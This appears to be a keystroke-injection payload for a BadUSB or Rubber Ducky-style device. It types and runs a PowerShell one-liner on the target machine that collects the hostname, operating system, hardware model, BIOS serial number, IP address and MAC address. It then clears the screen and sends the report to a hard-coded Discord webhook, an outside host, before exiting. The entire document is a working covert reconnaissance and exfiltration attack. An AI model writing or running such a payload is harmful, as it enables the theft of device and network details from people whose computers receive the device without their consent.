REM -Obtain HostName, Model, Serial Number, IP, MAC and OS, then, send it to Discord Webhook.
STRING $HNAME = (Get-CimInstance Win32_OperatingSystem | Select-Object CSName | FL | Out-String).Trim();$OS = (Get-CimInstance Win32_OperatingSystem | Select-Object  Caption | FL | Out-String).Trim();$MODEL = (Get-CimInstance -ClassName Win32_ComputerSystem | Select Model | FL | Out-String).Trim();$SERIAL = (Get-WmiObject win32_bios | select SerialNumber | FL | Out-String).Trim();$IP = (ipconfig | findstr "IPv4").Trim();$MAC = (ipconfig /all | findstr /R "..-..-..-..-..-.." | findstr "Physical").Trim();clear;$REPORT = echo $OS $MODEL $SERIAL $IP $MAC ;$POST = @{'username' = $HNAME.split(":")[1].Trim(); 'content' = $REPORT | Out-String}; Invoke-RestMethod -Uri https://discordapp.com/api/webhooks/1048317141193072744/llzpXPVGEVYuo0dOF_pt1iN-CFYIw0i1cmznrqk5ydlO6gBtvA-8mJEB9Lh9sl5D5iXZ -Method 'post' -Body $POST;exit
DELAY 250
ENTER
